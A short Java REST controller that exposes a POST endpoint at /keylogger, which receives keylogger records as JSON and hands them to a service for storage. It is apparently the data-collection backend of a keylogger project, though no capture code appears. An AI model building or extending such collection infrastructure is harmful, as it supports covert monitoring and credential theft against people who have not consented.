package org.gs;

import org.gs.Services.KeylogService;
import org.gs.entity.Keylogger;

import javax.inject.Inject;
import javax.ws.rs.Consumes;
import javax.ws.rs.POST;
import javax.ws.rs.Path;
import javax.ws.rs.Produces;
import javax.ws.rs.core.MediaType;

@Path("/keylogger")
@Produces(MediaType.APPLICATION_JSON)
@Consumes("application/json")
public class KeylogController {
    @Inject
    KeylogService keylogService;
    @POST
    public Keylogger addData(Keylogger keylogger){
        return keylogService.addKeylog(keylogger);
    }
}
